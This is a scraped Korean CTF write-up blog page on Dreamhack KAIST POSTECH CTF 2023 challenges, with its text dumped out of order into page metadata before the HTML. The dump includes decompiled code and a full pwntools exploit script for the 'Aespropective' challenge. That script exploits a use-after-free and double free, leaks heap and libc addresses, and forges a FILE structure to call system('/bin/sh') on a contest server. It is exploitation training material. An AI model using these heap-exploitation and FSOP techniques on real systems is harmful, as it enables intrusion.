open('./exploit.png','wb') as f: f.write(payload) # 0x400CC7 -\u003e read flag # 0x13e4 victim = av-\u003etop; size = chunksize (victim); if ((unsigned long) (size) \u003e= (unsigned long) (nb + MINSIZE)) { remainder_size = size - nb; remainder = chunk_at_offset (victim, nb); av-\u003etop = remainder; set_head (victim, nb | PREV_INUSE | (av != \u0026main_arena ? NON_MAIN_ARENA : 0)); set_head (remainder, remainder_size | PREV_INUSE); check_malloced_chunk (av, victim, nb); void *p = chunk2mem (victim); alloc_perturb (p, bytes); return p; } /* When we are using atomic ops to free fast chunks we can get here for all block sizes. */ else if (atomic_load_relaxed (\u0026av-\u003ehave_fastchunks)) { malloc_consolidate (av); /* restore original bin index */ if (in_smallbin_range (nb)) idx = smallbin_index (nb); else idx = largebin_index (nb); } glibc 2.27 소스를 확인해보면 chunk_at_offset에서 victim + nb를 하게 된다. heap overflow로 size를 덮어서 검증을 우회하고, 0xffff까지의 입력을 넣을 수 있으니 sign extension이 발생하며 이를 이용해서 top chunk로 부터의 상대 주소로 접근할 수 있게된다. 0xffff의 입력은 page 단위로 올라가기 충분하며, got에 접근할 수 있다. 그걸 이용해 exit got를 덮는다.\nAespropective Analysis print_menu(); std::istream::operator\u003e\u003e((int64_t)\u0026std::cin, (int64_t)sel); switch ( sel[0] ) { case 1: create_AES_obj(); break; case 2: remove_AES_obj(); break; case 3: set_plain_cipher_txt(); break; case 4: enc(); break; case 5: dec(\u0026std::cin, sel); // useless, not implemented yet break; default: continue; } } } // UAF leads to memory leak std::operator\u003c\u003c\u003cstd::char_traits\u003cchar\u003e\u003e((int64_t)\u0026std::cout, (int64_t)\"Enter key size: \"); std::istream::operator\u003e\u003e((int64_t)\u0026std::cin, (int64_t)\u0026keysz); switch ( keysz ) { case 128u: v1 = (AES_obj *)operator new(0x28uLL); init_AES_128(v1); aes_obj_ptr = v1; break; case 192u: v2 = (__int64 *)operator new(0x28uLL); init_AES_192(v2); aes_obj_ptr = (AES_obj *)v2; break; case 256u: v3 = (__int64 *)operator new(0x28uLL); init_AES_256(v3); aes_obj_ptr = (AES_obj *)v3; break; default: v4 = std::operator\u003c\u003c\u003cstd::char_traits\u003cchar\u003e\u003e((int64_t)\u0026std::cout, (int64_t)\"No way\"); ((void (__fastcall *)(__int64, void *))std::ostream::operator\u003c\u003c)(v4, \u0026std::endl\u003cchar,std::char_traits\u003cchar\u003e\u003e); exit(0); } keysz \u003e\u003e= 3; key_content = (void *)operator new[](keysz); set_cipher_key(key_content, keysz); key_schedule(aes_obj_ptr, (char *)key_content);// AES256 OoB. Key corrupted. v5 = std::operator\u003c\u003c\u003cstd::char_traits\u003cchar\u003e\u003e( (int64_t)\u0026std::cout, (int64_t)\"This is sha256 for the encryption key: \"); ((void (__fastcall *)(__int64, void *))std::ostream::operator\u003c\u003c)(v5, \u0026std::endl\u003cchar,std::char_traits\u003cchar\u003e\u003e); sha256((__int64)hashed_output, aes_obj_ptr); v6 = std::operator\u003c\u003c\u003cchar\u003e(\u0026std::cout, hashed_output); 키 사이즈에 따른 aes 객체들이 구현되어있다. 리버싱한 결과, AES ECB임이 확인되었다. 그리고 따로 처음에 키 스케쥴링 로직도 확인되었다.\nv6 = __readfsqword(0x28u); obj-\u003ecipher_and_round_keys = (char *)operator new[](0xB0uLL); *(_DWORD *)key_back = 0; *(_DWORD *)rcon = 0; for ( i = 0; i \u003c= 15; ++i ) obj-\u003ecipher_and_round_keys[i] = obj-\u003ekey_content[i]; for ( j = 16; j \u003c= 0xAF; j += 4 ) { key_back[0] = obj-\u003ecipher_and_round_keys[j - 4]; key_back[1] = obj-\u003ecipher_and_round_keys[j - 3]; key_back[2] = obj-\u003ecipher_and_round_keys[j - 2]; key_back[3] = obj-\u003ecipher_and_round_keys[j - 1]; if ( ((j / 4) \u0026 3) == 0 ) // multiples of 4, means following logics applied at roundkey's first col { Rot_word(obj, key_back); // shift upwards Sub_bytes(obj, (int8_t *)key_back); set_rcon(obj, rcon, j / 16); add_rcon(obj, (char *)key_back, rcon, (char *)key_back); } obj-\u003ecipher_and_round_keys[j] = key_back[0] ^ obj-\u003ecipher_and_round_keys[j - 16]; obj-\u003ecipher_and_round_keys[j + 1] = key_back[1] ^ obj-\u003ecipher_and_round_keys[j - 15]; obj-\u003ecipher_and_round_keys[j + 2] = key_back[2] ^ obj-\u003ecipher_and_round_keys[j - 14]; obj-\u003ecipher_and_round_keys[j + 3] = key_back[3] ^ obj-\u003ecipher_and_round_keys[j - 13]; } return __readfsqword(0x28u) ^ v6; } // do keyscheduling 이런식으로 처음에 round key들을 미리 계산한다.\nExploitation unsigned __int64 v6; // [rsp+28h] [rbp-8h] v6 = __readfsqword(0x28u); a1-\u003ecipher_and_round_keys = (char *)operator new[](0xD0uLL); v4 = 0; v5 = 0; for ( i = 0; i \u003c= 23; ++i ) a1-\u003ecipher_and_round_keys[i] = a1-\u003ekey_content[i]; for ( j = 24; j \u003c= 0xCF; j += 4 ) { LOWORD(v4) = *(_WORD *)\u0026a1-\u003ecipher_and_round_keys[j - 4]; BYTE2(v4) = a1-\u003ecipher_and_round_keys[j - 2]; HIBYTE(v4) = a1-\u003ecipher_and_round_keys[j - 1]; if ( !(j / 4 % 6) ) { Rot_word(a1, (unsigned __int8 *)\u0026v4); Sub_bytes(a1, (int8_t *)\u0026v4); set_rcon(a1, (char *)\u0026v5, j / 24); add_rcon(a1, (char *)\u0026v4, (char *)\u0026v5, (char *)\u0026v4); } a1-\u003ecipher_and_round_keys[j] = v4 ^ a1-\u003ecipher_and_round_keys[j - 24]; a1-\u003ecipher_and_round_keys[j + 1] = BYTE1(v4) ^ a1-\u003ecipher_and_round_keys[j - 23]; a1-\u003ecipher_and_round_keys[j + 2] = BYTE2(v4) ^ a1-\u003ecipher_and_round_keys[j - 22]; a1-\u003ecipher_and_round_keys[j + 3] = HIBYTE(v4) ^ a1-\u003ecipher_and_round_keys[j - 21]; } return __readfsqword(0x28u) ^ v6; } AES192의 키 스케쥴링 로직에서 OoB Read가 발생하며, secret키의 일부에 반영된다. 또한 remove 과정에 있어서 로직 버그가 발생하여 정상적이지 않은 노드가 free될 수 있었다.\nv9 = __readfsqword(0x28u); std::operator\u003c\u003c\u003cstd::char_traits\u003cchar\u003e\u003e((int64_t)\u0026std::cout, (int64_t)\"Which index do you want to delete ?\"); std::istream::operator\u003e\u003e((int64_t)\u0026std::cin, (int64_t)\u0026idx); v0 = idx; if ( v0 \u003e= get_length(vector_AES_obj) ) { v1 = std::operator\u003c\u003c\u003cstd::char_traits\u003cchar\u003e\u003e((int64_t)\u0026std::cout, (int64_t)\"No way\"); std::ostream::operator\u003c\u003c(v1, \u0026std::endl\u003cchar,std::char_traits\u003cchar\u003e\u003e); exit(0); } idx_1 = idx; iterator = get_vector_iterator(vector_AES_obj); v7 = get_ele_by_idx(\u0026iterator, idx_1); copy_element_ptr(\u0026element_ptr, (__int64)\u0026v7); remove_element((__int64)vector_AES_obj, element_ptr); v3 = *(void **)get_vect_at_idx(vector_AES_obj, idx);// OoB delete if ( v3 ) operator delete(v3, 0x28uLL); return __readfsqword(0x28u) ^ v9; } __int64 __fastcall sub_3524(__int64 vecotr, __int64 ele_vect_ptr) { __int64 ned; // rbx __int64 ele_by_idx; // rax __int64 ele_vec; // [rsp+0h] [rbp-40h] BYREF __int64 v6; // [rsp+8h] [rbp-38h] __int64 next_one; // [rsp+18h] [rbp-28h] BYREF __int64 end[4]; // [rsp+20h] [rbp-20h] BYREF v6 = vecotr; ele_vec = ele_vect_ptr; end[1] = __readfsqword(0x28u); end[0] = get_end(vecotr); // vector end next_one = get_ele_by_idx(\u0026ele_vec, 1LL); if ( is_not_end((__int64)\u0026next_one, (__int64)end) ) { ned = get_end(v6); ele_by_idx = get_ele_by_idx(\u0026ele_vec, 1LL); delete_element(ele_by_idx, ned, ele_vec); } *(_QWORD *)(v6 + 8) -= 8LL; // decrement sub_3872(v6, *(_QWORD *)(v6 + 8)); return ele_vec; } 마지막 노드를 삭제시 정상적으로 free가 된다. 하지만 중간 노드에 대해 삭제를 진행하면, dangling pointer가 남게 되고, double free가 발생할 수 있다. fastbin에서 free 검증이 널널하다는 것을 생각하면, dfb도 트리거가 가능해진다.\nstd::istream::operator\u003e\u003e((int64_t)\u0026std::cin, (int64_t)\u0026len); if ( len \u003e 0x400 || (len \u0026 0xF) != 0 ) { v0 = std::operator\u003c\u003c\u003cstd::char_traits\u003cchar\u003e\u003e((int64_t)\u0026std::cout, (int64_t)\"Invalid {plain,cipher}text length\"); std::ostream::operator\u003c\u003c(v0, \u0026std::endl\u003cchar,std::char_traits\u003cchar\u003e\u003e); exit(0); } if ( nbytes != len ) buf = (void *)operator new[](len); nbytes = len; std::operator\u003c\u003c\u003cstd::char_traits\u003cchar\u003e\u003e((int64_t)\u0026std::cout, (int64_t)\"Enter {plain,cipher}text: \"); read(0, buf, nbytes); return __readfsqword(0x28u) ^ v3; 여기서 freed chunk 대해서 reclaim이 가능하다. 또한 잠재적인 UAF가 발생할 수 있다.\nExploit script ''' 1) AES256 Vulnerable OoB READ while initializing Key. 2) deleting aes object triggers UAF. 3) buf reclaim leads to memleak. ''' from pwn import * \\#p = process('./out.bin') p = remote('host3.dreamhack.games', 18810) context.binary = e = ELF('./out.bin') libc = ELF('./bc.so.6') sla = lambda x,y : p.sendlineafter(x,y) sa = lambda x,y : p.sendafter(x,y) rvu = lambda x : p.recvuntil(x) def create_AES_object(keysz): sla(b'\u003e\u003e',str(1)) sla(b'size: ',str(keysz)) def remove_AES_object(idx): sla(b'\u003e\u003e',str(2)) sla(b'delete',str(idx)) def set_plain_cipher_txt(sz, payload): assert sz\u00260xf==0 sla(b'\u003e\u003e',str(3)) sla(b'length:',str(sz)) sa(b'text: ',payload) def encrypt(idx): sla(b'\u003e\u003e ',str(4)) sla(b'?',str(idx)) for i in range(20): # 11 create_AES_object(128) for i in range(19,12,-1): # 10 remove_AES_object(i) remove_AES_object(6) # free # vect[3] = vect[4], vect[5] remove_AES_object(4) # vect[1] = vect[2], vect[4] remove_AES_object(4) # for i in range(6): # set_plain_cipher_txt(0x20,b'\\xa0') # set_plain_cipher_txt(0x10,b'\\xa0') for i in range(3): create_AES_object(128) set_plain_cipher_txt(0x20,b'\\xa0') create_AES_object(128) set_plain_cipher_txt(0x10,b'\\xa0') set_plain_cipher_txt(0x20,b'\\xe8') encrypt(4) rv = (p.recv(0x20)) bin_base = u64(rv[:8]) - 0x00DBE8 heap = u64(rv[16:16+8]) success(hex(heap)) success(hex(bin_base)) remove_AES_object(3) set_plain_cipher_txt(0x20,p64(bin_base+0x0E030)+p64(0)) set_plain_cipher_txt(0x10,b'\\xa0') set_plain_cipher_txt(0x20,p64(bin_base + 0x00DBE8)) set_plain_cipher_txt(0x10,b'\\xa0') set_plain_cipher_txt(0x20,p64(0)) encrypt(3) rv = (p.recv(0x20)) libc_base = u64(rv[16:24]) - libc.sym._IO_2_1_stdout_ success(hex(libc_base)) vtable = 0x1e9260 + libc_base payload_start = heap -0x29b0 payload = b'' payload += p64(0x00000000fbad2084) payload += p64(0) * 12 payload += p64(libc_base + libc.sym._IO_2_1_stdin_) payload += p64(1) payload += p64(0xffffffffffffffff) payload += p64(0) payload += p64(heap) # lock payload += p64(0xffffffffffffffff) payload += p64(0) payload += p64(heap+0x20) payload += p64(0)*6 payload += p64(vtable) payload += p64(payload_start + len(payload)+8) payload += p64(0) * 7 payload += p64(libc_base + libc.sym[\"system\"]) payload += p64(0) payload += p64(libc_base+ next(libc.search(b'/bin/sh'))) payload += p64(1) assert len(payload) \u003c 0x200 remove_AES_object(2) stdcpp_target= libc_base + 0x1ded60 + 0x20d000 + 0x40 set_plain_cipher_txt(0x200,payload) set_plain_cipher_txt(0x20,p64(stdcpp_target)+p64(0)) remove_AES_object(1) set_plain_cipher_txt(0x20,p64(stdcpp_target)+p64(0)) remove_AES_object(0) set_plain_cipher_txt(0x20,p64(stdcpp_target)+p64(0)) # set target set_plain_cipher_txt(0x10,p64(bin_base+0x0E030)+p64(0)) set_plain_cipher_txt(0x20,p64(0xdeadbeef)) set_plain_cipher_txt(0x10,p64(bin_base+0x0E030)+p64(0)) pause() set_plain_cipher_txt(0x20,p64(payload_start)) success(payload_start) # remove_AES_object(1) # set_plain_cipher_txt(0x20,p64(bin_base+0x0E030)+p64(0)) # pause() # set_plain_cipher_txt(0x20,p64(0)*3+p64(payload_start)) # remove_AES_object(3) # set_plain_cipher_txt(0x20,p64(bin_base+0x0E030)+p64(0)) # for i in range(2): # set_plain_cipher_txt(0x20,b'\\x30') # set_plain_cipher_txt(0x10,b'A') # set_plain_cipher_txt(0x20,b'\\x30') # create_AES_object(128) # set_plain_cipher_txt(0x20,p64(bin_base + 0x0DBE8)+p64(0)) # can be changed to heap # set_plain_cipher_txt(0x10,b'A') # set_plain_cipher_txt(0x20,b'A') # encrypt(1) # rv = (p.recv(0x20)) p.interactive() double free를 이용해서 AES_object + 0x0에 위치한 vtable을 dummy vtable로 수정하고 encrypt를 호출해 plain text를 노출시켜서 메모리 릭을 할 수 있다. 이후 stdout을 릭하고 이를 덮어서 FSOP를 했다.\nLor - Diablo (pwn) \u0026 LoR - mechagolem (rev) Analysis 리버싱 겸 포너블이였다. 먼저 디스어셈블러를 짜고 편의기능을 추가해서 분석을 시도했다.\nimport gdb import struct inf = gdb.selected_inferior() start = 0x34785000 end = 0x3478a2d0 tmp = inf.read_memory(start,end-start) chains = [] for i in range(((end-start)//8)): chains.append(struct.unpack('",
  "wordCount" : "8629",
  "inLanguage": "en",
  "datePublished": "2023-12-20T00:00:00Z",
  "dateModified": "2023-12-20T00:00:00Z",
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://msh1307.kr/blog/dreamhack_kaist_postech_ctf_2023/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "msh1307",
    "logo": {
      "@type": "ImageObject",
      "url": "https://msh1307.kr/favicon.ico"
    }
  }
}
</script>
</head>

<body class="" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>

<header class="header sticky-header">
    
    <script async src="https://www.googletagmanager.com/gtag/js?id=G-BR89V2WEC0"></script>
    <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());
    gtag('config', 'G-BR89V2WEC0');
    </script>
    <nav class="nav">
        <div class="logo">
            <a href="https://msh1307.kr" accesskey="h" title="msh1307 (Alt + H)">msh1307</a>
            <span class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </span>
        </div>
        <ul id="menu">
            <li>
                <a href="https://msh1307.kr/" title="Home">
                    <span>Home</span>
                </a>
            </li>
            <li>
                <a href="https://msh1307.kr/blog" title="Blog">
                    <span>Blog</span>
                </a>
            </li>
            <li>
                <a href="https://msh1307.kr/about" title="About">
                    <span>About</span>
                </a>
            </li>
            <li>
                <a href="https://msh1307.kr/search" title="Search (Alt &#43; /)" accesskey=/>
                    <span>Search</span>
                </a>
            </li>
            <li>
                <a href="https://msh1307.kr/categories" title="Categories">
                    <span>Categories</span>
                </a>
            </li>
            <li>
                <a href="https://msh1307.kr/tags" title="Tags">
                    <span>Tags</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    <div class="breadcrumbs"><a href="https://msh1307.kr">Home</a>&nbsp;»&nbsp;<a href="https://msh1307.kr/blog/">Blogs</a></div>
    <h1 class="post-title">
      Dreamhack Kaist Postech CTF
    </h1>
    <div class="post-meta">


December 2023

</div>
  </header> <div class="toc">
    <details >
        <summary accesskey="c" title="(Alt + C)">
            <span class="details">‎ Table of Contents</span>
        </summary>

        <div class="inner"><ul>
                <li>
                    <a href="#sonofthec" aria-label="sonofthec">sonofthec</a><ul>
                        
                <li>
                    <a href="#analysis" aria-label="Analysis">Analysis</a></li>
                <li>
                    <a href="#exploitation" aria-label="Exploitation">Exploitation</a><ul>
                        
                <li>
                    <a href="#exploit-script" aria-label="Exploit script">Exploit script</a></li></ul>
                </li></ul>
                </li>
                <li>
                    <a href="#online-stego" aria-label="online stego">online stego</a><ul>
                        
                <li>
                    <a href="#analysis-1" aria-label="Analysis">Analysis</a></li>
                <li>
                    <a href="#exploitation-1" aria-label="Exploitation">Exploitation</a><ul>
                        
                <li>
                    <a href="#exploit-script-1" aria-label="Exploit script">Exploit script</a></li></ul>
                </li></ul>
                </li>
                <li>
                    <a href="#aespropective" aria-label="Aespropective">Aespropective</a><ul>
                        
                <li>
                    <a href="#analysis-2" aria-label="Analysis">Analysis</a></li>
                <li>
                    <a href="#exploitation-2" aria-label="Exploitation">Exploitation</a><ul>
                        
                <li>
                    <a href="#exploit-script-2" aria-label="Exploit script">Exploit script</a></li></ul>
                </li></ul>
                </li>
                <li>
                    <a href="#lor---diablo-pwn--lor---mechagolem-rev" aria-label="Lor - Diablo (pwn) &amp;amp; LoR - mechagolem (rev)">Lor - Diablo (pwn) &amp; LoR - mechagolem (rev)</a><ul>
                        
                <li>
                    <a href="#analysis-3" aria-label="Analysis">Analysis</a></li>
                <li>
                    <a href="#rev-sol" aria-label="Rev sol">Rev sol</a><ul>
                        
                <li>
                    <a href="#rev-sol-script" aria-label="Rev sol script">Rev sol script</a></li></ul>
                </li>
                <li>
                    <a href="#exploitation-3" aria-label="Exploitation">Exploitation</a><ul>
                        
                <li>
                    <a href="#exploit-script-3" aria-label="Exploit script">Exploit script</a></li></ul>
                </li></ul>
                </li>
                <li>
                    <a href="#broken-dahuns-heart" aria-label="Broken Dahun&amp;rsquo;s Heart">Broken Dahun&rsquo;s Heart</a><ul>
                        
                <li>
                    <a href="#analysis-4" aria-label="Analysis">Analysis</a></li>
                <li>
                    <a href="#exploitation-4" aria-label="Exploitation">Exploitation</a><ul>
                        
                <li>
                    <a href="#exploit-script-4" aria-label="Exploit script">Exploit script</a></li></ul>
                </li></ul>
                </li>
                <li>
                    <a href="#avatar-crude-shadow" aria-label="Avatar: Crude Shadow">Avatar: Crude Shadow</a><ul>
                        
                <li>
                    <a href="#analysis-5" aria-label="Analysis">Analysis</a></li>
                <li>
                    <a href="#exploitation-5" aria-label="Exploitation">Exploitation</a><ul>
                        
                <li>
                    <a href="#exploit-script-5" aria-label="Exploit script">Exploit script</a>
                </li>
            </ul>
            </li>
            </ul>
            </li>
            </ul>
        </div>
    </details>
</div>

  <div class="post-content"><p>개인전으로 2위를 했다.
2022, 2023 kaist postech ctf 모든 포너블 챌린지를 해결했고 리버싱 챌린지 하나를 해결했다.</p>
<h1 id="sonofthec">sonofthec<a hidden class="anchor" aria-hidden="true" href="#sonofthec">#</a></h1>
<h2 id="analysis">Analysis<a hidden class="anchor" aria-hidden="true" href="#analysis">#</a></h2>
<p>인터넷 검색을 통해 enum을 복구한다.
<img loading="lazy" src="blog/Dreamhack_KAIST_POSTECH_CTF_2023/enum.png" alt=""  />
</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-JavaScript" data-lang="JavaScript"><span style="display:flex;"><span>  <span style="color:#a6e22e">methods_fn</span>[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> (<span style="color:#a6e22e">__int64</span>)<span style="color:#a6e22e">exit_with_code</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">methods_fn</span>[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> (<span style="color:#a6e22e">__int64</span>)<span style="color:#a6e22e">register</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">methods_fn</span>[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">=</span> (<span style="color:#a6e22e">__int64</span>)<span style="color:#a6e22e">login</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">methods_fn</span>[<span style="color:#ae81ff">3</span>] <span style="color:#f92672">=</span> (<span style="color:#a6e22e">__int64</span>)<span style="color:#a6e22e">token_status</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">methods_fn</span>[<span style="color:#ae81ff">4</span>] <span style="color:#f92672">=</span> (<span style="color:#a6e22e">__int64</span>)<span style="color:#a6e22e">update</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">methods_fn</span>[<span style="color:#ae81ff">5</span>] <span style="color:#f92672">=</span> (<span style="color:#a6e22e">__int64</span>)<span style="color:#a6e22e">logout</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">result</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">upload</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">methods_fn</span>[<span style="color:#ae81ff">6</span>] <span style="color:#f92672">=</span> (<span style="color:#a6e22e">__int64</span>)<span style="color:#a6e22e">upload</span>;
</span></span></code></pre></div><p>json으로 입력을 받고 그에 따른 핸들러를 호출한다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-JavaScript" data-lang="JavaScript"><span style="display:flex;"><span>  <span style="color:#a6e22e">read_secret</span>();
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">args</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">json_object_object_get</span>(<span style="color:#a6e22e">json_obj</span>, <span style="color:#e6db74">&#34;args&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">STR</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">chrono</span><span style="color:#f92672">::</span><span style="color:#a6e22e">_V2</span><span style="color:#f92672">::</span><span style="color:#a6e22e">system_clock</span> <span style="color:#f92672">*</span>)<span style="color:#a6e22e">json_object_object_get</span>(<span style="color:#a6e22e">args</span>, <span style="color:#e6db74">&#34;username&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">chk_string</span>((<span style="color:#a6e22e">__int64</span>)<span style="color:#a6e22e">STR</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">object</span>.<span style="color:#a6e22e">username</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">json_object_get_string</span>(<span style="color:#a6e22e">STR</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">usr_name_len</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">strlen</span>((<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#a6e22e">object</span>.<span style="color:#a6e22e">username</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( <span style="color:#a6e22e">usr_name_len</span> <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0x10</span> )
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">STR</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">chrono</span><span style="color:#f92672">::</span><span style="color:#a6e22e">_V2</span><span style="color:#f92672">::</span><span style="color:#a6e22e">system_clock</span> <span style="color:#f92672">*</span>)<span style="color:#a6e22e">json_object_object_get</span>(<span style="color:#a6e22e">args</span>, <span style="color:#e6db74">&#34;email&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">chk_string</span>((<span style="color:#a6e22e">__int64</span>)<span style="color:#a6e22e">STR</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">object</span>.<span style="color:#a6e22e">email</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">json_object_get_string</span>(<span style="color:#a6e22e">STR</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">STR</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">chrono</span><span style="color:#f92672">::</span><span style="color:#a6e22e">_V2</span><span style="color:#f92672">::</span><span style="color:#a6e22e">system_clock</span> <span style="color:#f92672">*</span>)<span style="color:#a6e22e">json_object_object_get</span>(<span style="color:#a6e22e">args</span>, <span style="color:#e6db74">&#34;Car&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">chk_string</span>((<span style="color:#a6e22e">__int64</span>)<span style="color:#a6e22e">STR</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">object</span>.<span style="color:#a6e22e">Car</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">json_object_get_string</span>(<span style="color:#a6e22e">STR</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">STR</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">chrono</span><span style="color:#f92672">::</span><span style="color:#a6e22e">_V2</span><span style="color:#f92672">::</span><span style="color:#a6e22e">system_clock</span> <span style="color:#f92672">*</span>)<span style="color:#a6e22e">json_object_object_get</span>(<span style="color:#a6e22e">args</span>, <span style="color:#e6db74">&#34;VIN&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">chk_string</span>((<span style="color:#a6e22e">__int64</span>)<span style="color:#a6e22e">STR</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">object</span>.<span style="color:#a6e22e">Vin</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">json_object_get_string</span>(<span style="color:#a6e22e">STR</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">allocator</span><span style="color:#f92672">&lt;</span><span style="color:#66d9ef">char</span><span style="color:#f92672">&gt;::</span><span style="color:#a6e22e">allocator</span>(<span style="color:#a6e22e">vin</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">new_string</span>(<span style="color:#a6e22e">vin_1</span>, (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#a6e22e">object</span>.<span style="color:#a6e22e">Vin</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">allocator</span><span style="color:#f92672">&lt;</span><span style="color:#66d9ef">char</span><span style="color:#f92672">&gt;::~</span><span style="color:#a6e22e">allocator</span>();
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">string</span><span style="color:#f92672">::</span><span style="color:#a6e22e">basic_string</span>((<span style="color:#a6e22e">__int64</span>)<span style="color:#a6e22e">str</span>, (<span style="color:#a6e22e">__int64</span>)<span style="color:#a6e22e">vin_1</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">check_string_length</span>((<span style="color:#a6e22e">__int64</span>)<span style="color:#a6e22e">str</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">string</span><span style="color:#f92672">::~</span><span style="color:#a6e22e">string</span>(<span style="color:#a6e22e">str</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">STR</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">chrono</span><span style="color:#f92672">::</span><span style="color:#a6e22e">_V2</span><span style="color:#f92672">::</span><span style="color:#a6e22e">system_clock</span> <span style="color:#f92672">*</span>)<span style="color:#a6e22e">json_object_object_get</span>(<span style="color:#a6e22e">args</span>, <span style="color:#e6db74">&#34;Company&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">chk_string</span>((<span style="color:#a6e22e">__int64</span>)<span style="color:#a6e22e">STR</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">object</span>.<span style="color:#a6e22e">Company</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">json_object_get_string</span>(<span style="color:#a6e22e">STR</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">v18</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">chrono</span><span style="color:#f92672">::</span><span style="color:#a6e22e">_V2</span><span style="color:#f92672">::</span><span style="color:#a6e22e">system_clock</span><span style="color:#f92672">::</span><span style="color:#a6e22e">now</span>(<span style="color:#a6e22e">STR</span>);
